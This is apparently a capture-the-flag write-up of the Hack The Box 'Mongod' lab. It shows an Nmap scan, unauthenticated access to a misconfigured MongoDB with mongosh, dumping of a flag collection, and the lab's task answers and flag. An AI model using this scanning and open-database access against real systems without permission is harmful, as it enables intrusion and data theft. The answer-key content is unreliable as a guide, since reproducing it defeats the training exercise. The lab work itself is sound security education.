---
title: HackTheBox - Mongod
authors: Samarth
categories: [HackTheBox , Starting Point - Tier 0]
tags: [Linux, MongoDB, Databases, Reconnaissance, Misconfiguration, Anonymous/Guest Access]
math: true
mermaid: true
---

![Mongod-HTB](/assets/images/starting-point/Mongod-HTB/banner.png)

## TL;DR

This writeup documents the process of exploiting the [__Mongod__](https://app.hackthebox.com/starting-point){:target="_blank"} machine on Hack The Box. An Nmap scan revealed two open ports: `22` (SSH) and `27017` (MongoDB). The MongoDB instance was outdated and misconfigured, allowing unauthenticated access. Using `mongosh`, I connected to the database and discovered that access control was disabled. Enumeration of the available databases led to the discovery of a `flag` table in the `sensitive_information` database, which contained the flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports `22` and `27017`, corresponding to `SSH` and `MongoDB`. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn -p- 10.129.62.118 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-16 09:58 IST
Warning: 10.129.62.118 giving up on port because retransmission cap hit (6).
Stats: 0:13:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 55.19% done; ETC: 10:21 (0:10:39 remaining)
Stats: 0:18:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 76.80% done; ETC: 10:22 (0:05:33 remaining)
Stats: 0:22:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.70% done; ETC: 10:22 (0:01:02 remaining)
Nmap scan report for 10.129.62.118
Host is up (0.21s latency).
Not shown: 65445 closed tcp ports (conn-refused), 88 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
| mongodb-databases: 
```

## Enumeration

The `MongoDB` instance is running an outdated version, which might be vulnerable. Let's enumerate it further.

I will be using [__`mongosh`__](https://downloads.mongodb.com/compass/mongosh-2.3.9-linux-x64.tgz){:target="_blank"}, a `MongoDB` shell. 

## Exploitation

```bash
./mongosh mongodb://10.129.62.118:27017                        
Current Mongosh Log ID:	67b1938903963073bffe6910
Connecting to:		mongodb://10.129.62.118:27017/?directConnection=true&appName=mongosh+2.3.2
Using MongoDB:		3.6.8
Using Mongosh:		2.3.2
mongosh 2.3.9 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://www.mongodb.com/docs/mongodb-shell/


To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

------
   The server generated these startup warnings when booting
   2025-02-16T04:14:49.051+0000: 
   2025-02-16T04:14:49.051+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2025-02-16T04:14:49.051+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2025-02-16T04:14:51.696+0000: 
   2025-02-16T04:14:51.696+0000: ** WARNING: Access control is not enabled for the database.
   2025-02-16T04:14:51.696+0000: **          Read and write access to data and configuration is unrestricted.
   2025-02-16T04:14:51.696+0000:
------

test> help
```

Now that I have access to the `MongoDB` database, I will look into the available databases and tables.

```bash
test> show databases
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
```

I found five databases, so I will examine each one to identify sensitive information or a potential flag.

While checking the databases, I came across a table named `flag` in the `sensitive_information` database.

```bash
local> use sensitive_information
switched to db sensitive_information
sensitive_information> show tables
flag
sensitive_information> db.flag.find().pretty()
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
```

## Tasks

### How many TCP ports are open on the machine?

```plaintext
2
```

### Which service is running on port 27017 of the remote host?

```plaintext
MongoDB 3.6.8
```

### What type of database is MongoDB? (Choose: SQL or NoSQL)

```plaintext
NoSQL
```

### What is the command name for the Mongo shell that is installed with the mongodb-clients package?

```plaintext
mongosh
```

### What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)

```plaintext
show dbs
```

### What is the command used for listing out the collections in a database? (No need to include a trailing ;)

```plaintext
show collections
```

### What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?

```plaintext
db.flag.find().pretty()
```

### Submit root flag

```plaintext
1b6e6fb359e7c40241b6d431427ba6ea
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.